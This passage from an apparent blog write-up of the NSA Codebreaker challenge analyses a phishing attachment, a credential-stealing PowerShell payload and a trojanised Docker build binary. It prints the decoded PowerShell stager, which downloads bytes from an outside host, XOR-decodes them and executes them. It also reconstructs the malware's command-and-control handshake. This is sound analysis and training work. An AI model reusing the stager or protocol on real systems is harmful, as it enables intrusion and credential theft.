a. for i in *; do ripmime -i $i -d attachment_$i; done;</p>
</li>
<li>
<p>further see what kind of attachments are within each email message
a. file attachment*/*</p>
</li>
<li>
<p>oh the oopsie_update.pptx is not actually a powerpoint file&mldr; it&rsquo;s ASCII text</p>
</li>
<li>
<p>cat oopsie_update.pptx and see a powershell command to an &ldquo;-enc&rdquo; which sends a base64 string (which we know because of the &ldquo;==&rdquo; at the end</p>
</li>
<li>
<p>use cyberchef to decode the bas64 to see:
$bytes = (New-Object Net.WebClient).DownloadData(&lsquo;<a href="http://xomtq.invalid/analysis'">http://xomtq.invalid/analysis'</a>)</p>
<p>$prev = [byte] 173</p>
<p>$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
$prev = $bytes[$i] -bxor $prev
$prev
})</p>
<p>iex([System.Text.Encoding]::UTF8.GetString($dec))</p>
</li>
<li>
<p>we see it is downloading data, but notice that xomtq.invalid doesn&rsquo;t work so we gotta look more into it&mldr; we see that we should look at the HEX stream from the 200 HTTP request</p>
</li>
<li>
<p>Booting up VS Code, we need to write a script that takes the hex_val stream and put it into byte format, which we do via unhexlify</p>
</li>
<li>
<p>Next we do the same operation that is being done in the ASCII text from step 6 but in Python</p>
</li>
<li>
<p>Make sure to join all the items in the list and print it out, we get a huge powershell script and output that to fullpowershell.txt and then see at the bottom a POST request sent to <a href=http://wtmbi.invalid:8080>http://wtmbi.invalid:8080</a></p>
</li>
<li>
<p>going back to message_9.eml, I used &ldquo;head message_9.eml&rdquo; to find the Message-ID as <a href=mailto:161584985300.22130.15351049748726194876@oops.net>161584985300.22130.15351049748726194876@oops.net</a></p>
</li>
<li>
<p>Submit Message-ID and domain name to the challenge (wtmbi.invalid) and SUCCESS</p>
</li>
</ol>
<h1 id=task-4>Task 4
<span>
<a href=#task-4><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>A number of OOPS employees fell victim to the same attack, and we need to figure out what&rsquo;s been compromised! Examine the malware more closely to understand what it&rsquo;s doing. Then, use these artifacts to determine which account on the OOPS network has been compromised.</p>
<p>Downloads:</p>
<ul>
<li>OOPS forensic artifacts (artifacts.zip)</li>
</ul>
<h2 id=solution-3>Solution
<span>
<a href=#solution-3><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><ol>
<li>
<p>look at the fullpowershell.txt from last and identify what it is doing</p>
<p>a. you see that it is going into specific registries (PuTTY and WinSCP)</p>
<p>b. identify what is being taken for each registry</p>
<ul>
<li>
<p>PuTTY -> Source, Session, Hostname, Keyfile</p>
</li>
<li>
<p>WinSCP -> Source, Session, Hostname, Username, Password</p>
</li>
</ul>
</li>
<li>
<p>So now you know what is being taken and you know that the prettyXML.xml contains the registries -> next need to figure out how to find the right data</p>
<p>a. looking at the differences amongst the artifacts (only the ppks bc those are PuTTY private keys), you notice that some do NOT use any encryption -> this means that it is easier for a hacker to exploit (dkr_prd93, dkr_prd54, dkr_tst67, dkr_tst70, dkr_tst76)</p>
</li>
<li>
<p>looking into the XML file, we search for the dkr that are not encrypted, you find a node within with dkr_prd93 yayyyy (builder07@dkr_prd93)</p>
<p>a. machine name = dkr_prd93</p>
<p>b. builder07</p>
</li>
</ol>
<h1 id=task-5>Task 5
<span>
<a href=#task-5><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>A forensic analysis of the server you identified reveals suspicious logons shortly after the malicious emails were sent. Looks like the actor moved deeper into OOPS&rsquo; network. Yikes.</p>
<p>The server in question maintains OOPS' Docker image registry, which is populated with images created by OOPS clients. The images are all still there (phew!), but one of them has a recent modification date: an image created by the Prevention of Adversarial Network Intrusions Conglomerate (PANIC).</p>
<p>Due to the nature of PANIC&rsquo;s work, they have a close partnership with the FBI. They&rsquo;ve also long been a target of both government and corporate espionage, and they invest heavily in security measures to prevent access to their proprietary information and source code.</p>
<p>The FBI, having previously worked with PANIC, have taken the lead in contacting them. The FBI notified PANIC of the potential compromise and reminded them to make a report to DC3. During conversations with PANIC, the FBI learned that the image in question is part of their nightly build and test pipeline. PANIC reported that nightly build and regression tests had been taking longer than usual, but they assumed it was due to resourcing constraints on OOPS' end. PANIC consented to OOPS providing FBI with a copy of the Docker image in question.</p>
<p>Analyze the provided Docker image and identify the actor&rsquo;s techniques.</p>
<p>Downloads:</p>
<ul>
<li>PANIC Nightly Build + Test Docker Image (image.tar)</li>
</ul>
<h2 id=solution-4>Solution
<span>
<a href=#solution-4><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><ol>
<li>
<p>look at the manifest.json to find &ldquo;maintainer&rdquo; email (use &ldquo;cat manifest.json | jq&rdquo;)</p>
<p>a. jq is a nice thing to show json in pretty format (can pipe output to a new json)</p>
</li>
<li>
<p>tar -xf all the layer.tar files in each folder</p>
<p>a. rg &lsquo;git clone&rsquo; and look for the git clone url that is connected to a sus file &ldquo;build_test.sh&rdquo;</p>
</li>
<li>
<p>so most malicious files are binaries, so you are probably gonna be looking in &ldquo;bin&rdquo; directories</p>
<p>a. after searching around the different directories, you find the 8e&mldr; folder because it has a lot of folders</p>
<p>b. you check out bin from the main directory, but find nothing in there</p>
<p>c. since you didn&rsquo;t find anything, you look into usr/bin</p>
<ol>
<li>
<p>interesting, you find a lot of files</p>
</li>
<li>
<p>since you know malicious files/payloads are usually pretty big, you do &ldquo;ls -lh&rdquo; to see the file size and notice that the <code>make</code> file is 8.4M so that&rsquo;s probs the malicious file -> path is usr/bin/make</p>
</li>
</ol>
</li>
</ol>
<h1 id=task-6>Task 6
<span>
<a href=#task-6><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>Now that we&rsquo;ve found a malicious artifact, the next step is to understand what it&rsquo;s doing. Identify some characteristics of the communications between the malicious artifact and the LP.</p>
<h2 id=solution-5>Solution
<span>
<a href=#solution-5><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><ol>
<li>
<p>Open up the good ol ghidra with the file found from Task 5 (the make file)</p>
<p>a. Make your way to the main function -> see gitGrabber() function and look into it</p>
</li>
<li>
<p>To find the ip -> there is a variable called &ldquo;ip_00&rdquo; and opening up GDB GEF, you can run <code>rzlsqwdcbkzvl(13)</code> and get the ip as <code>198.51.100.84</code></p>
</li>
<li>
<p>To find the version number: go into other weird function -> <code>ospoimcwliqai</code> and see the &ldquo;version_00&rdquo; variable = <code>0.0.0.4-MOB</code></p>
</li>
<li>
<p>To find the key (the hardest): <code>call rzlsqwdcbkzvl(12)</code>. We used 0x12 because I manually enumerated calling this deobfuscation function (after I noticed ip_00 and version_00). &ldquo;0x12&rdquo; converts to 18 in decimal (<a href=https://bluesock.org/~willg/dev/ascii.html>ascii table reference</a>).</p>
<ul>
<li>However, when you call that function, it gives you some weird gibberish:</li>
</ul>
<p><code>$2 = 5555555f7d34 "\002f\255\063O\307Ǟv\274\064\345痾\232Rm\031\302\222\065IT\001O\034\071\347\367C3"</code></p>
<p>So, you have to use the GDB x command and run <code>x/32xb $2</code> and then manually copy and paste each hex into a line for the submission.</p>
<p>Final submission:</p>
<p><code>0266ad334fc7c79e76bc34e5e97be9a526d19c292354954014f1c39e7f7433</code></p>
</li>
</ol>
<p>Reference: <a href=https://visualgdb.com/gdbreference/commands/x>GDB x commad</a></p>
<h2 id=alternative-solution-process>Alternative Solution Process
<span>
<a href=#alternative-solution-process><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><p>Notice that this one funtion <code>rzlsqwdcbkzvl</code> takes in some int and Ghidra allows you to call functions and as you add in numbers, you find the information you want.</p>
<p><img src=/content/posts/images/codebreaker/beginningPart.png alt="beginning of calling function"></p>
<p><img src=/content/posts/images/codebreaker/solve.png alt="finding the relavent information for this challenge"></p>
<h1 id=task-7---solo>Task 7 - SOLO
<span>
<a href=#task-7---solo><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>With the information provided, PANIC worked with OOPS to revert their Docker image to a build prior to the compromise. Both companies are implementing additional checks to prevent a similar attack in the future.</p>
<p>Meanwhile, NSA&rsquo;s Cybersecurity Collaboration Center is working with DC3 to put together a Cybersecurity Advisory (CSA) for the rest of the DIB. DC3 has requested additional details about the techniques, tools, and targets of the cyber actor.</p>
<p>To get a better understanding of the techniques being used, we need to be able to connect to the listening post. Using the knowledge and material from previous tasks, analyze the protocol clients use to communicate with the LP. Our analysts believe the protocol includes an initial crypt negotiation followed by a series of client-generated requests, which the LP responds to. Provide the plaintext a client would send to initialize a new session with the provided UUID.</p>
<p>Downloads:</p>
<ul>
<li>Victim ID to use in initialization message (victim_id)</li>
</ul>
<h2 id=solution-6>Solution
<span>
<a href=#solution-6><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><p>Gotta allocate memory for the string.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>gef➤ call (string <span style=color:#ff79c6>*</span>) malloc(<span style=color:#ff79c6>sizeof</span>(std<span style=color:#ff79c6>::</span>string))
$<span style=color:#bd93f9>3</span> <span style=color:#ff79c6>=</span> (std<span style=color:#ff79c6>::</span>string <span style=color:#ff79c6>*</span>) <span style=color:#bd93f9>0x555555da4e10</span>
gef➤ call ((std<span style=color:#ff79c6>::</span>string<span style=color:#ff79c6>*</span>)<span style=color:#bd93f9>0x555555da4e10</span>)<span style=color:#ff79c6>-&gt;</span>basic_string()
gef➤ call ((std<span style=color:#ff79c6>::</span>string<span style=color:#ff79c6>*</span>)<span style=color:#bd93f9>0x555555da4e10</span>)<span style=color:#ff79c6>-&gt;</span>assign
(<span style=color:#f1fa8c>&#34;4da468db-1daa-481c-9be7-d9feee42a436&#34;</span>)
$<span style=color:#bd93f9>4</span> <span style=color:#ff79c6>=</span> (std<span style=color:#ff79c6>::</span>__cxx11<span style=color:#ff79c6>::</span>basic_string<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span>, std<span style=color:#ff79c6>::</span>char_traits<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;</span>, std<span style=color:#ff79c6>::</span>allocator<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;</span> <span style=color:#ff79c6>&gt;</span> <span style=color:#ff79c6>&amp;</span>) @<span style=color:#bd93f9>0x555555da4e10</span><span style=color:#ff79c6>:</span> {
  <span style=color:#ff79c6>static</span> npos <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xffffffffffffffff</span>,
  _M_dataplus <span style=color:#ff79c6>=</span> {
    <span style=color:#ff79c6>&lt;</span>std<span style=color:#ff79c6>::</span>allocator<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span> <span style=color:#ff79c6>=</span> {
      <span style=color:#ff79c6>&lt;</span>__gnu_cxx<span style=color:#ff79c6>::</span>new_allocator<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span> <span style=color:#ff79c6>=</span> {<span style=color:#ff79c6>&lt;</span>No data fields<span style=color:#ff79c6>&gt;</span>}, <span style=color:#ff79c6>&lt;</span>No data fields<span style=color:#ff79c6>&gt;</span>}, 
    members of std<span style=color:#ff79c6>::</span>__cxx11<span style=color:#ff79c6>::</span>basic_string<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span>, std<span style=color:#ff79c6>::</span>char_traits<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;</span>, std<span style=color:#ff79c6>::</span>allocator<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;</span> <span style=color:#ff79c6>&gt;::</span><span style=color:#8be9fd;font-style:italic>_Alloc_hider</span>:
    _M_p <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x555555da4e70</span> <span style=color:#f1fa8c>&#34;4da468db-1daa-481c-9be7-d9feee42a436&#34;</span>
  },
  _M_string_length <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x24</span>,
  {
    _M_local_buf <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;$&#34;</span>, <span style=color:#f1fa8c>&#39;\000&#39;</span> <span style=color:#ff79c6>&lt;</span>repeats <span style=color:#bd93f9>14</span> times<span style=color:#ff79c6>&gt;</span>,
    _M_allocated_capacity <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x24</span>
  }
}
</code></pre></div><p>Now we can call the function that allocates it with the UUID&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>gef➤ call elcftaqudeovx(<span style=color:#ff79c6>*</span>(<span style=color:#ff79c6>const</span> std<span style=color:#ff79c6>::</span>string<span style=color:#ff79c6>*</span>)<span style=color:#bd93f9>0x555555da4e10</span>,<span style=color:#bd93f9>0x10</span>)
$<span style=color:#bd93f9>9</span> <span style=color:#ff79c6>=</span> {
  <span style=color:#ff79c6>static</span> npos <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xffffffffffffffff</span>,
  _M_dataplus <span style=color:#ff79c6>=</span> {
    <span style=color:#ff79c6>&lt;</span>std<span style=color:#ff79c6>::</span>allocator<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span> <span style=color:#ff79c6>=</span> {
      <span style=color:#ff79c6>&lt;</span>__gnu_cxx<span style=color:#ff79c6>::</span>new_allocator<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span> <span style=color:#ff79c6>=</span> {<span style=color:#ff79c6>&lt;</span>No data fields<span style=color:#ff79c6>&gt;</span>}, <span style=color:#ff79c6>&lt;</span>No data fields<span style=color:#ff79c6>&gt;</span>}, 
    members of std<span style=color:#ff79c6>::</span>__cxx11<span style=color:#ff79c6>::</span>basic_string<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span>, std<span style=color:#ff79c6>::</span>char_traits<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;</span>, std<span style=color:#ff79c6>::</span>allocator<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;</span> <span style=color:#ff79c6>&gt;::</span><span style=color:#8be9fd;font-style:italic>_Alloc_hider</span>:
    _M_p <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x7fffffffddf0</span> <span style=color:#f1fa8c>&#34;&#34;</span>
  },
  _M_string_length <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x0</span>,
  {
    _M_local_buf <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\000&#39;</span> <span style=color:#ff79c6>&lt;</span>repeats <span style=color:#bd93f9>15</span> times<span style=color:#ff79c6>&gt;</span>,
    _M_allocated_capacity <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x0</span>
  }
}
</code></pre></div><p>BUT alas, that function actually just overwrites it so fuck that. So we must just rewrite where that _M_p pointer is and put the memory address of the UUID -> <code>set *$9._M_dataplus._M_p = 0x555555da4e10</code></p>
<p>Where does the UUID get used other than the above (elcftaqudeovx)?</p>
<p><code>string * coxclamjiqjlw(string *__return_storage_ptr__,string *uuid)</code></p>
<p>Before we can call that function, it takes in a <code>__return_storage_ptr__</code>. Then can do that</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>gef➤ call (string <span style=color:#ff79c6>*</span>) malloc(<span style=color:#ff79c6>sizeof</span>(std<span style=color:#ff79c6>::</span>string))
$<span style=color:#bd93f9>10</span> <span style=color:#ff79c6>=</span> (std<span style=color:#ff79c6>::</span>string <span style=color:#ff79c6>*</span>) <span style=color:#bd93f9>0x555555da4db0</span>
</code></pre></div><p>Calling the function was not fucking working, so I gotta edit the register and fuck with it.</p>
<p><code>set $rbp-0x1a8 = 0x555555da4db0</code></p>
<p>NOW, we can call the function again and hopefully get the freaking answer.</p>
<p><code>call (std::string *) (*0x5555555b2545(*0x555555da4db0,*0x555555da4e10))</code></p>
<p>Yeah so all that did not work so I instead did it statically.</p>
<h2 id=static-solve>Static Solve
<span>
<a href=#static-solve><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><p>Look at what everything is set to in ghidra within that function.</p>
<p><img src=/content/posts/images/codebreaker/thefunction.png alt="function of interest"></p>
<p><img src=/content/posts/images/codebreaker/ghidraVars.png alt="ghidra stuff"></p>
<p>Alternatively, you can click on the function that is taking in that variable and see what the size is (like <code>pnsikqtljaxba(&cmd_param,PARAM_CMD)</code>). You have to note down the size in order to correctly convert it to bytes and then back to a hex string/dump. We have to convert to bytes because that is what the program is doing to then send it to start the connection. We noticed this back when we saw how the UUID gets constructed. In the picture below, we see randombytes() so that tells us that there is a conversion of bytes.</p>
<p><img src=/content/posts/images/codebreaker/assigningUUID.png alt="assigning uuid"></p>
<p>The parts that are sent are now defined below with the correct byte sizes.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>magic_start: <span style=color:#bd93f9>1553</span>DC11
cmd_param: <span style=color:#bd93f9>1700</span>
cmd_length: <span style=color:#bd93f9>0002</span>
cmd_data: <span style=color:#bd93f9>0002</span>
uuid_param: <span style=color:#bd93f9>1708</span>
uuid_length: <span style=color:#bd93f9>0010</span>
uuid: <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;M</span><span style=color:#f1fa8c>\xa4</span><span style=color:#f1fa8c>h</span><span style=color:#f1fa8c>\xdb\x1d\xaa</span><span style=color:#f1fa8c>H</span><span style=color:#f1fa8c>\x1c\x9b\xe7\xd9\xfe\xee</span><span style=color:#f1fa8c>B</span><span style=color:#f1fa8c>\xa4</span><span style=color:#f1fa8c>6&#39;</span>
magic_end: E38A5B8C
</code></pre></div><p>Then convert that to hex (in the convert.py script) and we get the hex dump :).</p>
<p><code>1553dc11170000020002170800104da468db1daa481c9be7d9feee42a436e38a5b8c</code></p>
</div>
<div class=post-info>
<div class="post-date dt-published">2022-01-04</div>
<a class="post-hidden-url u-url" href=https://murphe22.com/posts/nsacodebreaker/>https://murphe22.com/posts/nsacodebreaker/</a>
<a href=https://murphe22.com class="p-name p-author post-hidden-author h-card" rel=me>Emily Murphy</a>
<div class=post-taxonomies>
<ul class=post-categories>
<li><a href=https://murphe22.com/categories/writeups/>writeups</a></li>
</ul>
<ul class=post-tags>
<li><a href=https://murphe22.com/tags/ctfs/>#ctfs</a></li>
<li><a href=https://murphe22.com/tags/writeups/>#writeups</a></li>
</ul>
</div>
</div>
</article>
<div class="pagination post-pagination">
<div class="left pagination-item disabled">
</div>
<div class="right pagination-item">
<a href=/posts/metactf/>MetaCTF 2021</a>
</div>
</div>
</main>
<footer class=common-footer>
<div class=common-footer-bottom>
<div class=copyright>
<p>© Emily Murphy, 2022<br>
Powered by <a target=_blank rel="noopener noreferrer" href=https://gohugo.io/>Hugo</a>, theme <a target=_blank rel="noopener noreferrer" href=https://github.com/mitrichius/hugo-theme-anubis>Anubis</a>.<br>
</p>
</div>
<button class=theme-switcher>
Dark theme
</button>
<script>const STORAGE_KEY='user-color-scheme',defaultTheme="light";let currentTheme,switchButton,autoDefinedScheme=window.matchMedia('(prefers-color-scheme: dark)');const autoChangeScheme=a=>{currentTheme=a.matches?'dark':'light',document.documentElement.setAttribute('data-theme',currentTheme),changeButtonText()};document.addEventListener('DOMContentLoaded',function(){switchButton=document.querySelector('.theme-switcher'),currentTheme=detectCurrentScheme(),currentTheme=='dark'&&document.documentElement.setAttribute('data-theme','dark'),currentTheme=='auto'&&(autoChangeScheme(autoDefinedScheme),autoDefinedScheme.addListener(autoChangeScheme)),changeButtonText(),switchButton.addEventListener('click',switchTheme,!1)});function detectCurrentScheme(){return localStorage.getItem(STORAGE_KEY)?localStorage.getItem(STORAGE_KEY):defaultTheme?defaultTheme:window.matchMedia?window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light':'light'}function changeButtonText(){switchButton.textContent=currentTheme=='dark'?"Light theme":"Dark theme"}function switchTheme(a){currentTheme=='dark'?(localStorage.setItem(STORAGE_KEY,'light'),document.documentElement.setAttribute('data-theme','light'),currentTheme='light'):(localStorage.setItem(STORAGE_KEY,'dark'),document.documentElement.setAttribute('data-theme','dark'),currentTheme='dark'),changeButtonText()}</script>
</div>
<p class="h-card vcard">
<a href=https://murphe22.com class="p-name u-url url fn" rel=me>Emily Murphy</a>
</p>
</footer>
</div>
</body>
</html>